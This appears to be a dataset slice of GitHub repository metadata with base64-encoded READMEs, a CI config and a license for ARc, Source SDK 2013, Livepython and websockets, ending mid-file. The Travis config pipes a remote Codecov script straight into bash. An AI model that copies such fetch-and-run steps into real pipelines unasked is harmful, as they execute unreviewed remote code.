Oi8vZmFjZWJvb2suZ2l0aHViLmlvL3JlYWN0LyksIFtXZWJwYWNrXShodHRw
czovL2dpdGh1Yi5jb20vd2VicGFjay93ZWJwYWNrKSwgW3JlYWN0LXJvdXRl
cl0oaHR0cHM6Ly9naXRodWIuY29tL1JlYWN0VHJhaW5pbmcvcmVhY3Qtcm91
dGVyKSBhbmQgW0plc3RdKGh0dHBzOi8vZmFjZWJvb2suZ2l0aHViLmlvL2pl
c3QvKS4KCiAgLSAjIyMgW2ByZWR1eGBdKGh0dHBzOi8vZ2l0aHViLmNvbS9k
aWVnb2hhei9hcmMvdHJlZS9yZWR1eCkgPHN1cD48c3ViPihbY29tcGFyZV0o
aHR0cHM6Ly9naXRodWIuY29tL2RpZWdvaGF6L2FyYy9jb21wYXJlL21hc3Rl
ci4uLnJlZHV4P2RpZmY9c3BsaXQjZmlsZXNfYnVja2V0KSk8L3N1Yj48L3N1
cD4KCiAgICBNYXN0ZXIgcGx1cyBbcmVkdXhdKGh0dHBzOi8vZ2l0aHViLmNv
bS9yZWFjdGpzL3JlZHV4KSwgW3JlZHV4LXNhZ2FdKGh0dHBzOi8vZ2l0aHVi
LmNvbS95ZWxvdWFmaS9yZWR1eC1zYWdhKSBhbmQgW3JlZHV4LWZvcm1dKGh0
dHBzOi8vZ2l0aHViLmNvbS9lcmlrcmFzL3JlZHV4LWZvcm0pLgoKICAgIC0g
IyMjIFtgcmVkdXgtc3NyYF0oaHR0cHM6Ly9naXRodWIuY29tL2RpZWdvaGF6
L2FyYy90cmVlL3JlZHV4LXNzcikgPHN1cD48c3ViPihbY29tcGFyZV0oaHR0
cHM6Ly9naXRodWIuY29tL2RpZWdvaGF6L2FyYy9jb21wYXJlL3JlZHV4Li4u
cmVkdXgtc3NyP2RpZmY9c3BsaXQjZmlsZXNfYnVja2V0KSk8L3N1Yj48L3N1
cD4KCiAgICAgIFJlZHV4IHBsdXMgW1NlcnZlciBTaWRlIFJlbmRlcmluZ10o
aHR0cHM6Ly9naXRodWIuY29tL3JlYWN0anMvcmVkdXgvYmxvYi9tYXN0ZXIv
ZG9jcy9yZWNpcGVzL1NlcnZlclJlbmRlcmluZy5tZCkKCiMjIFdoeQoKSSd2
ZSBiZWVuIGEgd2ViIGRldmVsb3BlciBmb3IgdGhlIHBhc3QgMTQgeWVhcnMg
YW5kIGFmdGVyIGRlYWxpbmcgd2l0aCBJRSB2cy4gTmV0c2NhcGUgd2Fycywg
YDx0YWJsZT5gIGxheW91dHMgYW5kIGZsYXNoIHdlYnNpdGVzLCBJIGNhbiBz
YXkgdGhhdCB3ZSBhcmUgbm93IGxpdmluZyBpbiB0aGUgYmVzdCBtb21lbnQg
aW4gd2ViIGRldmVsb3BtZW50LiBXZWIgY29tcG9uZW50cyBhcmUgYXdlc29t
ZSBhbmQgUmVhY3QgbWFrZXMgaXQgYmV0dGVyLgoKUmVhY3QgZW5jb3VyYWdl
cyB5b3UgdG8gY3JlYXRlIHZlcnkgc21hbGwgYW5kIHB1cmUgY29tcG9uZW50
cy4gSG93ZXZlciwgYXMgeW91ciBwcm9qZWN0IGdyb3dzLCB5b3Ugd2lsbCBo
YXZlIGFuIGluY3JlYXNpbmdseSBjb21wbGV4IGNvbXBvbmVudHMgZm9sZGVy
LiBBdCBzb21lIHBvaW50LCB0aGlzIHdpbGwgYmUgcmVhbGx5IGh1Z2UgYW5k
IGhhcmQgdG8gbWFpbnRhaW4uCgpJIGhhZCBhIFJlYWN0IHByb2plY3Qgd2l0
aCBtb3JlIHRoYW4gMTAwIGNvbXBvbmVudHMgaW4gdGhlIGBjb21wb25lbnRz
YCBmb2xkZXIuIFRoZSBmaXJzdCBhcHByb2FjaCBJIHRyaWVkIHRvIG9yZ2Fu
aXplIGl0IHdhcyBzZXBhcmF0aW5nIHRoZSBjb21wb25lbnRzIGJ5IGRvbWFp
biAoZGVzY3JpYmVkIFtoZXJlXShodHRwOi8vbWFybWVsYWIuY29tL2Jsb2cv
MjAxNS8xMi8xNy9yZWFjdC1kaXJlY3Rvcnktc3RydWN0dXJlLmh0bWwpKSwg
YnV0IEkgcmVhbGl6ZWQgdGhhdCBtb3N0IG9mIG15IGNvbXBvbmVudHMgZGlk
bid0IGJlbG9uZyB0byBhbnkgZG9tYWluLCBidXQgd2VyZSBzaGFyZWQuIFRo
aXMgbWVhbnQgdGhhdCBteSBwcm9ibGVtcyBqdXN0IG1vdmVkIHRvIHRoZSBg
Y29tbW9uc2AgZm9sZGVyLgoKVGhlIFtBdG9taWMgRGVzaWduXShodHRwOi8v
YnJhZGZyb3N0LmNvbS9ibG9nL3Bvc3QvYXRvbWljLXdlYi1kZXNpZ24vKSBh
cHByb2FjaCBjb21lcyBoYW5keSB0byBzb2x2ZSB0aGlzIHByb2JsZW0gYmVj
YXVzZSBpdCBjb25zaWRlcnMgdGhlIHJldXNhYmlsaXR5IHRocm91Z2ggY29t
cG9zaXRpb24sICp3aGljaCBpcyBhY3R1YWxseSB3aGF0IFJlYWN0IGlzKi4g
WW91IHdpbGwgaGF2ZSB5b3VyIG1pbmltYWwvc3R5bGlzaCBjb21wb25lbnRz
IGluIG9uZSBmb2xkZXIsIHBhZ2VzIGluIGFub3RoZXIgYW5kIHNvIG9uLgoK
IyMgU2V0dXAKCiMjIyAxLiBHZXQgdGhlIHNvdXJjZSBjb2RlCgpKdXN0IGNs
b25lIG9uZSBvZiB0aGUgQVJjIFticmFuY2hlc10oI2JyYW5jaGVzKToKYGBg
c2gKJCBnaXQgY2xvbmUgLWIgbWFzdGVyIGh0dHBzOi8vZ2l0aHViLmNvbS9k
aWVnb2hhei9hcmMgbXktYXBwCiQgY2QgbXktYXBwCmBgYAoKWW91IHdpbGwg
cHJvYmFibHkgd2FudCB0byByZW1vdmUgQVJjIGdpdCBoaXN0b3J5IGFuZCBz
dGFydCBhIGJyYW5kIG5ldyByZXBvc2l0b3J5OgpgYGBzaAokIHJtIC1yZiAu
Z2l0CiQgZ2l0IGluaXQKYGBgCgojIyMgMi4gSW5zdGFsbCBkZXBlbmRlbmNp
ZXMKCmBgYHNoCiQgbnBtIGluc3RhbGwKYGBgCgojIyMgMy4gUnVuIHRoZSBh
cHAKCmBgYHNoCiQgbnBtIHJ1biBkZXYKYGBgCgpJdCB3aWxsIHN0YXJ0IHRo
ZSBkZXZlbG9wbWVudCBzZXJ2ZXIgd2l0aCBbSE1SXShodHRwczovL3dlYnBh
Y2suZ2l0aHViLmlvL2RvY3MvaG90LW1vZHVsZS1yZXBsYWNlbWVudCkgb24g
dG9wIG9mIGl0LgoKPiBbaHR0cDovL2xvY2FsaG9zdDozMDAwXShodHRwOi8v
bG9jYWxob3N0OjMwMDApIOKAlCBEZXZlbG9wbWVudCBzZXJ2ZXI8YnI+Cj4g
W2h0dHA6Ly9sb2NhbGhvc3Q6MzAwMV0oaHR0cDovL2xvY2FsaG9zdDozMDAx
KSDigJQgV2VicGFjayBhc3NldHMgc2VydmVyIChmb3IgYHJlZHV4LXNzcmAg
b25seSk8YnI+CgpOb3cgeW91IGNhbiBvcGVuIFtodHRwOi8vbG9jYWxob3N0
OjMwMDBdKGh0dHA6Ly9sb2NhbGhvc3Q6MzAwMCkgaW4gYnJvd3NlciBhbmQg
c3RhcnQgZGV2ZWxvcGluZy4KCiMjIENvbnRyaWJ1dGluZwoKV2hlbiBzdWJt
aXR0aW5nIGFuIGlzc3VlLCB1c2UgdGhlIGZvbGxvd2luZyBwYXR0ZXJucyBp
biB0aGUgdGl0bGUgZm9yIGJldHRlciB1bmRlcnN0YW5kaW5nOgpgYGBiYXNo
Clt2MC4zLjEtcmVkdXhdIFNvbWV0aGluZyB3cm9uZyBpcyBub3QgcmlnaHQg
IyB0aGUgdjAuMy4xIHJlbGVhc2Ugb2YgdGhlIHJlZHV4IGJyYW5jaApbcmVk
dXhdIFNvbWV0aGluZyB3cm9uZyBpcyBub3QgcmlnaHQgIyB0aGUgYWN0dWFs
IGNvZGUgb2YgdGhlIHJlZHV4IGJyYW5jaApTb21ldGhpbmcgd3JvbmcgaXMg
cmlnaHQgIyBnZW5lcmFsLCByZWxhdGVkIHRvIG1hc3RlciBvciBub3QgZGly
ZWN0bHkgcmVsYXRlZCB0byBhbnkgYnJhbmNoCmBgYAoKUFJzIGFyZSB2ZXJ5
IGFwcHJlY2lhdGVkLiBGb3IgYnVncy9mZWF0dXJlcyBjb25zaWRlciBjcmVh
dGluZyBhbiBpc3N1ZSBiZWZvcmUgc2VuZGluZyBhIFBSLgoKIyMgTGljZW5z
ZQoKTUlUIMKpIFtEaWVnbyBIYXpdKGh0dHBzOi8vZ2l0aHViLmNvbS9kaWVn
b2hheikK
",,"bGFuZ3VhZ2U6IG5vZGVfanMKbm9kZV9qczoKICAtIDgKc2NyaXB0OgogIC0g
bnBtIHJ1biBsaW50CiAgLSBucG0gdGVzdCAtLSAtLWNvdmVyYWdlCiAgLSBu
cG0gcnVuIGJ1aWxkCmNhY2hlOgogIC0geWFybgphZnRlcl9zdWNjZXNzOgog
IC0gYmFzaCA8KGN1cmwgLXMgaHR0cHM6Ly9jb2RlY292LmlvL2Jhc2gpCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'source-sdk-2013',10980729,b'The 2013 edition of the Source SDK',b'C++',218,2395,,2395,False,b'https://api.github.com/repos/ValveSoftware/source-sdk-2013/forks',"ICAgICAgICAgICAgICAgU09VUkNFIDEgU0RLIExJQ0VOU0UKClNvdXJjZSBT
REsgQ29weXJpZ2h0KGMpIFZhbHZlIENvcnAuICAKClRISVMgRE9DVU1FTlQg
REVTQ1JJQkVTIEEgQ09OVFJBQ1QgQkVUV0VFTiBZT1UgQU5EIFZBTFZFIApD
T1JQT1JBVElPTiAoIlZhbHZlIikuICBQTEVBU0UgUkVBRCBJVCBCRUZPUkUg
RE9XTkxPQURJTkcgT1IgVVNJTkcgClRIRSBTT1VSQ0UgRU5HSU5FIFNESyAo
IlNESyIpLiBCWSBET1dOTE9BRElORyBBTkQvT1IgVVNJTkcgVEhFIApTT1VS
Q0UgRU5HSU5FIFNESyBZT1UgQUNDRVBUIFRISVMgTElDRU5TRS4gSUYgWU9V
IERPIE5PVCBBR1JFRSBUTyAKVEhFIFRFUk1TIE9GIFRISVMgTElDRU5TRSBQ
TEVBU0UgRE9O4oCZVCBET1dOTE9BRCBPUiBVU0UgVEhFIFNESy4gIAoKICBZ
b3UgbWF5LCBmcmVlIG9mIGNoYXJnZSwgZG93bmxvYWQgYW5kIHVzZSB0aGUg
U0RLIHRvIGRldmVsb3AgYSBtb2RpZmllZCBWYWx2ZSBnYW1lIApydW5uaW5n
IG9uIHRoZSBTb3VyY2UgZW5naW5lLiAgWW91IG1heSBkaXN0cmlidXRlIHlv
dXIgbW9kaWZpZWQgVmFsdmUgZ2FtZSBpbiBzb3VyY2UgYW5kIApvYmplY3Qg
Y29kZSBmb3JtLCBidXQgb25seSBmb3IgZnJlZS4gVGVybXMgb2YgdXNlIGZv
ciBWYWx2ZSBnYW1lcyBhcmUgZm91bmQgaW4gdGhlIFN0ZWFtIApTdWJzY3Jp
YmVyIEFncmVlbWVudCBsb2NhdGVkIGhlcmU6IGh0dHA6Ly9zdG9yZS5zdGVh
bXBvd2VyZWQuY29tL3N1YnNjcmliZXJfYWdyZWVtZW50LyAKCiAgWW91IG1h
eSBjb3B5LCBtb2RpZnksIGFuZCBkaXN0cmlidXRlIHRoZSBTREsgYW5kIGFu
eSBtb2RpZmljYXRpb25zIHlvdSBtYWtlIHRvIHRoZSAKU0RLIGluIHNvdXJj
ZSBhbmQgb2JqZWN0IGNvZGUgZm9ybSwgYnV0IG9ubHkgZm9yIGZyZWUuICBB
bnkgZGlzdHJpYnV0aW9uIG9mIHRoaXMgU0RLIG11c3QgCmluY2x1ZGUgdGhp
cyBMSUNFTlNFIGZpbGUgYW5kIHRoaXJkcGFydHlsZWdhbG5vdGljZXMudHh0
LiAgCiAKICBBbnkgZGlzdHJpYnV0aW9uIG9mIHRoZSBTREsgb3IgYSBzdWJz
dGFudGlhbCBwb3J0aW9uIG9mIHRoZSBTREsgbXVzdCBpbmNsdWRlIHRoZSBh
Ym92ZSAKY29weXJpZ2h0IG5vdGljZSBhbmQgdGhlIGZvbGxvd2luZzogCgog
ICAgRElTQ0xBSU1FUiBPRiBXQVJSQU5USUVTLiAgVEhFIFNPVVJDRSBTREsg
QU5EIEFOWSAKICAgIE9USEVSIE1BVEVSSUFMIERPV05MT0FERUQgQlkgTElD
RU5TRUUgSVMgUFJPVklERUQgCiAgICAiQVMgSVMiLiAgVkFMVkUgQU5EIElU
UyBTVVBQTElFUlMgRElTQ0xBSU0gQUxMIAogICAgV0FSUkFOVElFUyBXSVRI
IFJFU1BFQ1QgVE8gVEhFIFNESywgRUlUSEVSIEVYUFJFU1MgCiAgICBPUiBJ
TVBMSUVELCBJTkNMVURJTkcsIEJVVCBOT1QgTElNSVRFRCBUTywgSU1QTElF
RCAKICAgIFdBUlJBTlRJRVMgT0YgTUVSQ0hBTlRBQklMSVRZLCBOT04tSU5G
UklOR0VNRU5ULCAKICAgIFRJVExFIEFORCBGSVRORVNTIEZPUiBBIFBBUlRJ
Q1VMQVIgUFVSUE9TRS4gIAoKICAgIExJTUlUQVRJT04gT0YgTElBQklMSVRZ
LiAgSU4gTk8gRVZFTlQgU0hBTEwgVkFMVkUgT1IgCiAgICBJVFMgU1VQUExJ
RVJTIEJFIExJQUJMRSBGT1IgQU5ZIFNQRUNJQUwsIElOQ0lERU5UQUwsIAog
ICAgSU5ESVJFQ1QsIE9SIENPTlNFUVVFTlRJQUwgREFNQUdFUyBXSEFUU09F
VkVSIAogICAgKElOQ0xVRElORywgV0lUSE9VVCBMSU1JVEFUSU9OLCBEQU1B
R0VTIEZPUiBMT1NTIE9GIAogICAgQlVTSU5FU1MgUFJPRklUUywgQlVTSU5F
U1MgSU5URVJSVVBUSU9OLCBMT1NTIE9GIAogICAgQlVTSU5FU1MgSU5GT1JN
QVRJT04sIE9SIEFOWSBPVEhFUiBQRUNVTklBUlkgTE9TUykgCiAgICBBUklT
SU5HIE9VVCBPRiBUSEUgVVNFIE9GIE9SIElOQUJJTElUWSBUTyBVU0UgVEhF
IAogICAgRU5HSU5FIEFORC9PUiBUSEUgU0RLLCBFVkVOIElGIFZBTFZFIEhB
UyBCRUVOIAogICAgQURWSVNFRCBPRiBUSEUgUE9TU0lCSUxJVFkgT0YgU1VD
SCBEQU1BR0VTLiAgCiAKICAgICAgIApJZiB5b3Ugd291bGQgbGlrZSB0byB1
c2UgdGhlIFNESyBmb3IgYSBjb21tZXJjaWFsIHB1cnBvc2UsIHBsZWFzZSBj
b250YWN0IFZhbHZlIGF0IApzb3VyY2VlbmdpbmVAdmFsdmVzb2Z0d2FyZS5j
b20uCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'livepython',105598718,b'Visually trace Python code in real-time.',b'JavaScript',10,2395,,2395,False,b'https://api.github.com/repos/agermanidis/livepython/forks',"IVtdKGh0dHBzOi8vaS5pbWd1ci5jb20vR004dnJDei5wbmcpCiFbXShodHRw
czovL2kuaW1ndXIuY29tLzM2b0VoM1IuZ2lmKQoKIyMgTGl2ZXB5dGhvbiAK
IyMjIFdhdGNoIHlvdXIgUHl0aG9uIHJ1biBsaWtlIGEgbW92aWUuCgojIyMj
IyBOT1RFOiBMaXZlcHl0aG9uIGlzIGFscGhhIHNvZnR3YXJlLiBJdCBkb2Vz
bid0IGhhbmRsZSBhIGxvdCBvZiBlZGdlIGNhc2VzIGFuZCBmZWF0dXJlcyBt
YXkgY2hhbmdlLgoKTGl2ZXB5dGhvbiBpcyBhIGRlc2t0b3AgYXBwIHRoYXQg
bGV0cyB5b3UgdmlzdWFsbHkgdHJhY2UsIGluIHJlYWwtdGltZSwgdGhlIGV4
ZWN1dGlvbiBvZiBhIFB5dGhvbiBwcm9ncmFtLiBJbiBhZGRpdGlvbiwgaXQg
Y2FuIHRyYWNrIGNoYW5nZXMgaW4gZ2xvYmFsIGFuZCBsb2NhbCB2YXJpYWJs
ZXMgYXMgeW91ciBwcm9ncmFtIGlzIHJ1bm5pbmcuIExpdmVweXRob24gaXMg
bWVhbnQgdG8gZ2l2ZSB5b3UgYSBxdWljayBncmFzcCBvZiBhIHByb2dyYW0n
cyBleGVjdXRpb24gZmxvdy4gSXQncyBsZXNzIG1lc3N5IHRoYW4gc3ByaW5r
bGluZyBwcmludCBzdGF0ZW1lbnRzIHRocm91Z2hvdXQgeW91ciBjb2RlIGFu
ZCBzaW1wbGVyIHRvIHVzZSB0aGFuIGRlYnVnZ2Vycy9wcm9maWxlcnMuIAoK
TGl2ZXB5dGhvbiBjYW4gYmUgbGF1bmNoZWQgZnJvbSB0aGUgY29tbWFuZC1s
aW5lIGFzIGVhc2lseSBhczoKCiAgICBsaXZlcHl0aG9uIFtwcm9ncmFtXSBb
YXJncy4uLl0KCioqQ29udHJvbHM6KioKClNQQUNFOiBQbGF5L1BhdXNlIHRo
ZSBwcm9ncmFtLgoKTGVmdC9SaWdodCBBcnJvdzogQ2hhbmdlIHNwZWVkIG9m
IGV4ZWN1dGlvbi4KClY6IE9wZW4vQ2xvc2UgVmFyaWFibGUgSW5zcGVjdG9y
LgoKIyMjIENvbXBhdGliaWxpdHkKCnwgKipQeXRob24gVmVyc2lvbioqIHwg
KipDb21wYXRpYmxlPyoqIHwKfC0tLS0tLS0tLS0tfC0tLS0tLS0tLS0tLS0t
LXwKfCAzLjYgICAgICAgfCDinIUgICAgICAgICAgICAgfAp8IDMuNSAgICAg
ICB8IOKchSAgICAgICAgICAgICB8CnwgMi43ICAgICAgIHwg4pyFICAgICAg
ICAgICAgIHwKfCAyLjYgICAgICAgfCDinYwgICAgICAgICAgICAgfAoKIyMj
IEluc3RhbGxhdGlvbgoKICAgIG5wbSBpbnN0YWxsIGxpdmVweXRob24gLWcK
CiMjIyBEZXZlbG9wbWVudAoKPGltZyBzcmM9Imh0dHBzOi8vaS5pbWd1ci5j
b20vUVdjN01MVC5wbmciIHdpZHRoPTUwMD48L2ltZz4KCkxpdmVweXRob24g
aGFzIDMgbWFpbiBjb21wb25lbnRzOiAKCiogYSBQeXRob24gW3RyYWNlcl0o
aHR0cHM6Ly9naXRodWIuY29tL2FnZXJtYW5pZGlzL2xpdmVweXRob24vYmxv
Yi9tYXN0ZXIvdHJhY2VyLnB5KSB0aGF0IHVzZXMgYHN5cy5zZXR0cmFjZSgp
YCB0byBpbnRlcmNlcHQgZXZlcnkgbGluZSBvZiB5b3VyIHByb2dyYW0gYXMg
aXQncyBiZWluZyBldmFsdWF0ZWQKKiBhbiBbRWxlY3Ryb24gYXBwXShodHRw
czovL2dpdGh1Yi5jb20vYWdlcm1hbmlkaXMvbGl2ZXB5dGhvbi9ibG9iL21h
c3Rlci9tYWluLmpzKSB0aGF0IGlzIHJlc3BvbnNpYmxlIGZvciB0aGUgcmVu
ZGVyaW5nIHRoZSBMaXZlcHl0aG9uIGZyb250ZW5kCiogYSBub2RlLmpzIFtn
YXRld2F5IHNjcmlwdF0oaHR0cHM6Ly9naXRodWIuY29tL2FnZXJtYW5pZGlz
L2xpdmVweXRob24vYmxvYi9tYXN0ZXIvYmluL2xpdmVweXRob24pIHRoYXQg
bWFuYWdlcyBjb21tdW5pY2F0aW9uIGJldHdlZW4gdGhlIGZyb250ZW5kIGFu
ZCB0aGUgdHJhY2VyIAoKSWYgeW91IHdhbnQgdG8gbWFrZSBjaGFuZ2VzIHRv
IExpdmVweXRob24sIHlvdSB3aWxsIG5lZWQgdG8gcnVuIFt3ZWJwYWNrXSho
dHRwczovL3dlYnBhY2suanMub3JnLyk6CgogICAgd2VicGFjawoKVGhlbiB5
b3UgY2FuIHRlc3QgeW91ciBidWlsdCB2ZXJzaW9uIG9mIGxpdmVweXRob24g
YnkgcnVubmluZzoKCiAgICBiaW4vbGl2ZXB5dGhvbiBbeW91ciBweXRob24g
cHJvZ3JhbV0KCiMjIyBMaWNlbnNlCgpNSVQK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'websockets',9113587,b'Library for building WebSocket servers and clients in Python',b'Python',32,2395,,2395,False,b'https://api.github.com/repos/aaugustin/websockets/forks',"Li4gaW1hZ2U6OiBsb2dvL2hvcml6b250YWwuc3ZnCiAgIDp3aWR0aDogNDgw
cHgKICAgOmFsdDogd2Vic29ja2V0cwoKfHJ0ZHwgfHB5cGktdnwgfHB5cGkt
cHl2ZXJzaW9uc3wgfHB5cGktbHwgfHB5cGktd2hlZWx8IHxjaXJjbGVjaXwg
fGNvZGVjb3Z8CgouLiB8cnRkfCBpbWFnZTo6IGh0dHBzOi8vcmVhZHRoZWRv
Y3Mub3JnL3Byb2plY3RzL3dlYnNvY2tldHMvYmFkZ2UvP3ZlcnNpb249bGF0
ZXN0CiAgIDp0YXJnZXQ6IGh0dHBzOi8vd2Vic29ja2V0cy5yZWFkdGhlZG9j
cy5pby8KCi4uIHxweXBpLXZ8IGltYWdlOjogaHR0cHM6Ly9pbWcuc2hpZWxk
cy5pby9weXBpL3Yvd2Vic29ja2V0cy5zdmcKICAgIDp0YXJnZXQ6IGh0dHBz
Oi8vcHlwaS5weXRob24ub3JnL3B5cGkvd2Vic29ja2V0cwoKLi4gfHB5cGkt
cHl2ZXJzaW9uc3wgaW1hZ2U6OiBodHRwczovL2ltZy5zaGllbGRzLmlvL3B5
cGkvcHl2ZXJzaW9ucy93ZWJzb2NrZXRzLnN2ZwogICAgOnRhcmdldDogaHR0
cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlwaS93ZWJzb2NrZXRzCgouLiB8cHlw
aS1sfCBpbWFnZTo6IGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vcHlwaS9sL3dl
YnNvY2tldHMuc3ZnCiAgICA6dGFyZ2V0OiBodHRwczovL3B5cGkucHl0aG9u
Lm9yZy9weXBpL3dlYnNvY2tldHMKCi4uIHxweXBpLXdoZWVsfCBpbWFnZTo6
IGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vcHlwaS93aGVlbC93ZWJzb2NrZXRz
LnN2ZwogICAgOnRhcmdldDogaHR0cHM6Ly9weXBpLnB5dGhvbi5vcmcvcHlw
aS93ZWJzb2NrZXRzCgouLiB8Y2lyY2xlY2l8IGltYWdlOjogaHR0cHM6Ly9p
bWcuc2hpZWxkcy5pby9jaXJjbGVjaS9wcm9qZWN0L2dpdGh1Yi9hYXVndXN0
aW4vd2Vic29ja2V0cy5zdmcKICAgOnRhcmdldDogaHR0cHM6Ly9jaXJjbGVj
aS5jb20vZ2gvYWF1Z3VzdGluL3dlYnNvY2tldHMKCi4uIHxjb2RlY292fCBp
bWFnZTo6IGh0dHBzOi8vY29kZWNvdi5pby9naC9hYXVndXN0aW4vd2Vic29j
a2V0cy9icmFuY2gvbWFzdGVyL2dyYXBoL2JhZGdlLnN2ZwogICAgOnRhcmdl
dDogaHR0cHM6Ly9jb2RlY292LmlvL2doL2FhdWd1c3Rpbi93ZWJzb2NrZXRz
CgpXaGF0IGlzIGBgd2Vic29ja2V0c2BgPwotLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLQoKYGB3ZWJzb2NrZXRzYGAgaXMgYSBsaWJyYXJ5IGZvciBidWlsZGlu
ZyBXZWJTb2NrZXQgc2VydmVyc18gYW5kIGNsaWVudHNfIGluClB5dGhvbiB3
aXRoIGEgZm9jdXMgb24gY29ycmVjdG5lc3MgYW5kIHNpbXBsaWNpdHkuCgou
LiBfc2VydmVyczogaHR0cHM6Ly9naXRodWIuY29tL2FhdWd1c3Rpbi93ZWJz
b2NrZXRzL2Jsb2IvbWFzdGVyL2V4YW1wbGUvc2VydmVyLnB5Ci4uIF9jbGll
bnRzOiBodHRwczovL2dpdGh1Yi5jb20vYWF1Z3VzdGluL3dlYnNvY2tldHMv
YmxvYi9tYXN0ZXIvZXhhbXBsZS9jbGllbnQucHkKCkJ1aWx0IG9uIHRvcCBv
ZiBgYGFzeW5jaW9gYCwgUHl0aG9uJ3Mgc3RhbmRhcmQgYXN5bmNocm9ub3Vz
IEkvTyBmcmFtZXdvcmssIGl0CnByb3ZpZGVzIGFuIGVsZWdhbnQgY29yb3V0
aW5lLWJhc2VkIEFQSS4KCmBEb2N1bWVudGF0aW9uIGlzIGF2YWlsYWJsZSBv
biBSZWFkIHRoZSBEb2NzLiA8aHR0cHM6Ly93ZWJzb2NrZXRzLnJlYWR0aGVk
b2NzLmlvLz5gXwoKSGVyZSdzIGhvdyBhIGNsaWVudCBzZW5kcyBhbmQgcmVj
ZWl2ZXMgbWVzc2FnZXM6CgouLiBjb3B5LXBhc3RlZCBiZWNhdXNlIEdpdEh1
YiBkb2Vzbid0IHN1cHBvcnQgdGhlIGluY2x1ZGUgZGlyZWN0aXZlCgouLiBj
b2RlOjogcHl0aG9uCgogICAgIyEvdXNyL2Jpbi9lbnYgcHl0aG9uCgogICAg
aW1wb3J0IGFzeW5jaW8KICAgIGltcG9ydCB3ZWJzb2NrZXRzCgogICAgYXN5
bmMgZGVmIGhlbGxvKHVyaSk6CiAgICAgICAgYXN5bmMgd2l0aCB3ZWJzb2Nr
ZXRzLmNvbm5lY3QodXJpKSBhcyB3ZWJzb2NrZXQ6CiAgICAgICAgICAgIGF3
YWl0IHdlYnNvY2tldC5zZW5kKCJIZWxsbyB3b3JsZCEiKQogICAgICAgICAg
ICBhd2FpdCB3ZWJzb2NrZXQucmVjdigpCgogICAgYXN5bmNpby5nZXRfZXZl
bnRfbG9vcCgpLnJ1bl91bnRpbF9jb21wbGV0ZSgKICAgICAgICBoZWxsbygn
d3M6Ly9sb2NhbGhvc3Q6ODc2NScpKQoKQW5kIGhlcmUncyBhbiBlY2hvIHNl
cnZlcjoKCi4uIGNvZGU6OiBweXRob24KCiAgICAjIS91c3IvYmluL2VudiBw
eXRob24KCiAgICBpbXBvcnQgYXN5bmNpbwogICAgaW1wb3J0IHdlYnNvY2tl
dHMKCiAgICBhc3luYyBkZWYgZWNobyh3ZWJzb2NrZXQsIHBhdGgpOgogICAg
ICAgIGFzeW5jIGZvciBtZXNzYWdlIGluIHdlYnNvY2tldDoKICAgICAgICAg
ICAgYXdhaXQgd2Vic29ja2V0LnNlbmQobWVzc2FnZSkKCiAgICBhc3luY2lv
LmdldF9ldmVudF9sb29wKCkucnVuX3VudGlsX2NvbXBsZXRlKAogICAgICAg
IHdlYnNvY2tldHMuc2VydmUoZWNobywgJ2xvY2FsaG9zdCcsIDg3NjUpKQog
ICAgYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpLnJ1bl9mb3JldmVyKCkKCkRv
ZXMgdGhhdCBsb29rIGdvb2Q/CgpgR2V0IHN0YXJ0ZWQgd2l0aCB0aGUgdHV0
b3JpYWwhIDxodHRwczovL3dlYnNvY2tldHMucmVhZHRoZWRvY3MuaW8vZW4v
c3RhYmxlL2ludHJvLmh0bWw+YF8KCi4uIHJhdzo6IGh0bWwKCiAgICA8aHI+
CiAgICA8aW1nIGFsaWduPSJsZWZ0IiBoZWlnaHQ9IjE1MCIgd2lkdGg9IjE1
MCIgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYWF1
Z3VzdGluL3dlYnNvY2tldHMvbWFzdGVyL2xvZ28vdGlkZWxpZnQucG5nIj4K
ICAgIDxoMyBhbGlnbj0iY2VudGVyIj48aT53ZWJzb2NrZXRzIGZvciBlbnRl
cnByaXNlPC9pPjwvaDM+CiAgICA8cCBhbGlnbj0iY2VudGVyIj48aT5BdmFp
bGFibGUgYXMgcGFydCBvZiB0aGUgVGlkZWxpZnQgU3Vic2NyaXB0aW9uPC9p
PjwvcD4KICAgIDxwIGFsaWduPSJjZW50ZXIiPjxpPlRoZSBtYWludGFpbmVy
cyBvZiB3ZWJzb2NrZXRzIGFuZCB0aG91c2FuZHMgb2Ygb3RoZXIgcGFja2Fn
ZXMgYXJlIHdvcmtpbmcgd2l0aCBUaWRlbGlmdCB0byBkZWxpdmVyIGNvbW1l
cmNpYWwgc3VwcG9ydCBhbmQgbWFpbnRlbmFuY2UgZm9yIHRoZSBvcGVuIHNv
dXJjZSBkZXBlbmRlbmNpZXMgeW91IHVzZSB0byBidWlsZCB5b3VyIGFwcGxp
Y2F0aW9ucy4gU2F2ZSB0aW1lLCByZWR1Y2UgcmlzaywgYW5kIGltcHJvdmUg
Y29kZSBoZWFsdGgsIHdoaWxlIHBheWluZyB0aGUgbWFpbnRhaW5lcnMgb2Yg
